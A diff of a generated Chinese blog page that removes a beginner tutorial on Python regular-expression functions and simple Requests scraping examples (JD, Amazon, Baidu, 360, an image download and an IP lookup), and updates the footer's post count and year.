-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">pattern = re.compile(<span class="string">r'\d+'</span>)</span><br><span class="line">print( re.split(pattern,<span class="string">'one1two2three3four4'</span>))</span><br><span class="line"> </span><br><span class="line"><span class="comment">### 输出 ###</span></span><br><span class="line"><span class="comment"># ['one', 'two', 'three', 'four', '']</span></span><br></pre></td></tr></table></figure>
-
-<h3 id="（4）re-findall-pattern-string-flags"><a href="#（4）re-findall-pattern-string-flags" class="headerlink" title="（4）re.findall(pattern, string[, flags])"></a>（4）re.findall(pattern, string[, flags])</h3><p>搜索string，以列表形式返回全部能匹配的子串。我们通过这个例子来感受一下</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">pattern = re.compile(<span class="string">r'\d+'</span>)</span><br><span class="line">print( re.findall(pattern,<span class="string">'one1two2three3four4'</span>))</span><br><span class="line"> </span><br><span class="line"><span class="comment">### 输出 ###</span></span><br><span class="line"><span class="comment"># ['1', '2', '3', '4']</span></span><br></pre></td></tr></table></figure>
-
-<h3 id="（5）re-finditer-pattern-string-flags"><a href="#（5）re-finditer-pattern-string-flags" class="headerlink" title="（5）re.finditer(pattern, string[, flags])"></a>（5）re.finditer(pattern, string[, flags])</h3><p>搜索string，返回一个顺序访问每一个匹配结果（Match对象）的迭代器。我们通过下面的例子来感受一下</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">pattern = re.compile(<span class="string">r'\d+'</span>)</span><br><span class="line"><span class="keyword">for</span> m <span class="keyword">in</span> re.finditer(pattern,<span class="string">'one1two2three3four4'</span>):</span><br><span class="line">    print( m.group()),</span><br><span class="line"> </span><br><span class="line"><span class="comment">### 输出 ###</span></span><br><span class="line"><span class="comment"># 1 2 3 4</span></span><br></pre></td></tr></table></figure>
-
-<h3 id="（6）re-sub-pattern-repl-string-count"><a href="#（6）re-sub-pattern-repl-string-count" class="headerlink" title="（6）re.sub(pattern, repl, string[, count])"></a>（6）re.sub(pattern, repl, string[, count])</h3><p>使用repl替换string中每一个匹配的子串后返回替换后的字符串。<br> 当repl是一个字符串时，可以使用\id或\g、\g引用分组，但不能使用编号0。<br> 当repl是一个方法时，这个方法应当只接受一个参数（Match对象），并返回一个字符串用于替换（返回的字符串中不能再引用分组）。<br> count用于指定最多替换次数，不指定时全部替换。</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">pattern = re.compile(<span class="string">r'(\w+) (\w+)'</span>)</span><br><span class="line">s = <span class="string">'i say, hello world!'</span></span><br><span class="line"> </span><br><span class="line">print( re.sub(pattern,<span class="string">r'\2 \1'</span>, s))</span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">func</span><span class="params">(m)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> m.group(<span class="number">1</span>).title() + <span class="string">' '</span> + m.group(<span class="number">2</span>).title()</span><br><span class="line"> </span><br><span class="line">print( re.sub(pattern,func, s))</span><br></pre></td></tr></table></figure>
-
-<h3 id="（7）re-subn-pattern-repl-string-count"><a href="#（7）re-subn-pattern-repl-string-count" class="headerlink" title="（7）re.subn(pattern, repl, string[, count])"></a>（7）re.subn(pattern, repl, string[, count])</h3><p>返回 (sub(repl, string[, count]), 替换次数)。</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">pattern = re.compile(<span class="string">r'(\w+) (\w+)'</span>)</span><br><span class="line">s = <span class="string">'i say, hello world!'</span></span><br><span class="line"> </span><br><span class="line">print( re.subn(pattern,<span class="string">r'\2 \1'</span>, s))</span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">func1</span><span class="params">(m)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> m.group(<span class="number">1</span>).title() + <span class="string">' '</span> + m.group(<span class="number">2</span>).title()</span><br><span class="line"> </span><br><span class="line">print( re.subn(pattern,func1, s))</span><br><span class="line"> </span><br><span class="line"><span class="comment">### output ###</span></span><br><span class="line"><span class="comment"># ('say i, world hello!', 2)</span></span><br><span class="line"><span class="comment"># ('I Say, Hello World!', 2)</span></span><br></pre></td></tr></table></figure>
-
-<h3 id="6-Requests库网络爬虫实战"><a href="#6-Requests库网络爬虫实战" class="headerlink" title="6.Requests库网络爬虫实战"></a>6.Requests库网络爬虫实战</h3><p>1.京东</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">url = <span class="string">"https://item.jd.com/5145492.html"</span></span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    r = requests.get(url)</span><br><span class="line">    r.raise_for_status()</span><br><span class="line">    r.encoding = r.apparent_encoding</span><br><span class="line">    print(r.text[:<span class="number">1000</span>])</span><br><span class="line"><span class="keyword">except</span>:</span><br><span class="line">    print(<span class="string">"爬取失败"</span>)</span><br></pre></td></tr></table></figure>
-
-<p>2.亚马逊</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 直接爬取亚马逊商品是会被拒绝访问，所以需要添加'user-agent'字段</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">url = <span class="string">"https://www.amazon.cn/gp/product/B01M8L5Z3Y"</span></span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    kv = &#123;<span class="string">'user-agent'</span>:<span class="string">'Mozilla/5.0'</span>&#125; <span class="comment"># 使用代理访问</span></span><br><span class="line">    r = requests.get(url, headers = kv)</span><br><span class="line">    r.raise_for_status()</span><br><span class="line">    r.encoding = r.apparent_encoding</span><br><span class="line">    print(t.text[<span class="number">1000</span>:<span class="number">2000</span>])</span><br><span class="line"><span class="keyword">except</span>:</span><br><span class="line">    print(<span class="string">"爬取失败"</span>)</span><br></pre></td></tr></table></figure>
-
-<p>3.百度/360搜索关键词提交</p>
-<pre><code>　搜索引擎关键词提交接口</code></pre><p>　· 百度的关键词接口：<br>　<a href="http://www.baidu.com/s?wd=keyword" target="_blank" rel="noopener">http://www.baidu.com/s?wd=keyword</a><br>　· 360的关键词接口：<br>　<a href="http://www.so.com/s?q=keyword" target="_blank" rel="noopener">http://www.so.com/s?q=keyword</a></p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 百度</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">keyword = <span class="string">"Python"</span></span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    kv = &#123;<span class="string">'wd'</span>:keyword&#125;</span><br><span class="line">    r = requests.get(<span class="string">"http://www.baidu.com/s"</span>,params=kv)</span><br><span class="line">    print(r.request.url)</span><br><span class="line">    r.raise_for_status()</span><br><span class="line">    print(len(r.text))</span><br><span class="line"><span class="keyword">except</span>:</span><br><span class="line">    print(<span class="string">"爬取失败"</span>)</span><br></pre></td></tr></table></figure>
-
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 360</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">keyword = <span class="string">"Python"</span></span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    kv = &#123;<span class="string">'q'</span>:keyword&#125;</span><br><span class="line">    r = requests.get(<span class="string">"http://www.so.com/s"</span>,params=kv)</span><br><span class="line">    print(r.request.url)</span><br><span class="line">    r.raise_for_status()</span><br><span class="line">    print(len(r.text))</span><br><span class="line"><span class="keyword">except</span>:</span><br><span class="line">    print(<span class="string">"爬取失败"</span>)</span><br></pre></td></tr></table></figure>
-
-<p>4.网络图片的爬取和存储</p>
-<p>网络图片链接的格式：</p>
-<p><a href="http://www.example.com/picture.jpg" target="_blank" rel="noopener">http://www.example.com/picture.jpg</a></p>
-<p>国家地理：</p>
-<p><a href="http://www.nationalgeographic.com.cn/" target="_blank" rel="noopener">http://www.nationalgeographic.com.cn/</a></p>
-<p>选择一张图片链接：</p>
-<p><a href="http://image.nationalgeographic.com.cn/2017/0704/20170704030835566.jpg" target="_blank" rel="noopener">http://image.nationalgeographic.com.cn/2017/0704/20170704030835566.jpg</a></p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">图片爬取全代码</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line">url = <span class="string">"http://image.nationalgeographic.com.cn/2017/0704/20170704030835566.jpg"</span></span><br><span class="line">root = <span class="string">"D://pics//"</span></span><br><span class="line">path = root + url.split(<span class="string">'/'</span>)[<span class="number">-1</span>]</span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> os.path.exists(root):</span><br><span class="line">        os.mkdir(root)</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> os.path.exists(path):</span><br><span class="line">        r = requests.get(url)</span><br><span class="line">        <span class="keyword">with</span> open(path,<span class="string">'wb'</span>) <span class="keyword">as</span> f:</span><br><span class="line">            f.write(r.content)</span><br><span class="line">            f.close()</span><br><span class="line">            print(<span class="string">"文件保存成功"</span>)</span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="string">with open(path,'wb') as f:等价于</span></span><br><span class="line"><span class="string">try:</span></span><br><span class="line"><span class="string">f = open(path, 'wb')</span></span><br><span class="line"><span class="string">f = write(r.content)</span></span><br><span class="line"><span class="string">finally:</span></span><br><span class="line"><span class="string">if f:</span></span><br><span class="line"><span class="string">f.close()</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        print(<span class="string">"文件已存在"</span>)</span><br><span class="line"><span class="keyword">except</span>:</span><br><span class="line">    print(<span class="string">"爬取失败"</span>)</span><br></pre></td></tr></table></figure>
-
-<p>5.IP地址归属地的自动查询</p>
-<p><a href="http://www.ip138.com" target="_blank" rel="noopener">www.ip138.com</a> IP查询</p>
-<p><a href="http://ip138.com/ips138.asp?ip=ipaddress" target="_blank" rel="noopener">http://ip138.com/ips138.asp?ip=ipaddress</a></p>
-<p><a href="http://m.ip138.com/ip.asp?ip=ipaddress" target="_blank" rel="noopener">http://m.ip138.com/ip.asp?ip=ipaddress</a></p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">url = <span class="string">"http://m.ip138.com/ip.asp?ip="</span></span><br><span class="line">ip = <span class="string">"114.114.114.114"</span></span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    r = requests.get(url + ip)</span><br><span class="line">    r.raise_for_status()</span><br><span class="line">    r.encoding = r.apparent_encoding</span><br><span class="line">    print(r.text[<span class="number">1900</span>:])</span><br><span class="line"><span class="keyword">except</span>:</span><br><span class="line">    print(<span class="string">"爬取失败"</span>)</span><br></pre></td></tr></table></figure>
-
-<h4 id="参考链接："><a href="#参考链接：" class="headerlink" title="参考链接："></a>参考链接：</h4><p><a href="https://www.cnblogs.com/yan-lei/p/7445460.html" target="_blank" rel="noopener">https://www.cnblogs.com/yan-lei/p/7445460.html</a></p>
-<p><a href="https://www.cnblogs.com/ranxf/p/7808537.html（后续需进一步看）" target="_blank" rel="noopener">https://www.cnblogs.com/ranxf/p/7808537.html（后续需进一步看）</a></p>
-<p><a href="https://blog.csdn.net/Amigo_1997/article/details/87936132" target="_blank" rel="noopener">https://blog.csdn.net/Amigo_1997/article/details/87936132</a></p>
-<p><a href="https://www.jianshu.com/p/0e3715bd9c25" target="_blank" rel="noopener">https://www.jianshu.com/p/0e3715bd9c25</a></p>
-
-          
-        
-      
-    </div>
-    
-    
-    
-
-
-
-    
-
-    
-
-    
-
-
-
-    <footer class="post-footer">
-      
-
-      
-
-      
-
-      
-      
-        <div class="post-eof"></div>
-      
-    </footer>
-  </div>
-  
-  
-  
-  </article>
-
-
-    
   </section>
 
   
@@ -4433,7 +3748,7 @@ window.onmouseout = function () {
               
                 <a href="/archives/">
               
-                  <span class="site-state-item-count">12</span>
+                  <span class="site-state-item-count">14</span>
                   <span class="site-state-item-name">posts</span>
                 </a>
               </div>
@@ -4490,7 +3805,7 @@ window.onmouseout = function () {
 
     <footer id="footer" class="footer">
       <div class="footer-inner">
-        <div class="copyright">&copy; <span itemprop="copyrightYear">2019</span>
+        <div class="copyright">&copy; <span itemprop="copyrightYear">2020</span>
   <span class="with-love">
     <i class="fa fa-heart"></i>
   </span>
